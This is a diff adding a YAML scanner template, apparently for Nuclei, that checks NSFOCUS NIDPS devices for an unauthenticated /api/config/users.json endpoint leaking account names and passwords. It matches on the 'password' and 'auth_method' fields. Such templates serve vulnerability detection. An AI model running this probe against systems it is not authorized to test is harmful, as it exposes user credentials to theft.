@@ -1,0 +1,27 @@
+id: nsfocus-nidps-disclosure
+
+info:
+  name: NSFOCUS-NIDPS users.json - Information Disclosure
+  author: bl
+  severity: high
+  description: |
+    绿盟ips /api/config/users.json 接口存在信息泄露漏洞，泄漏了用户的账号密码等信息
+  classification:
+    cwe-id: CWE-200
+  tags: NSFOCUS-NIDPS
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/config/users.json"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'auth_method'
+          - 'password'
+          - 'mail'
+        condition: and
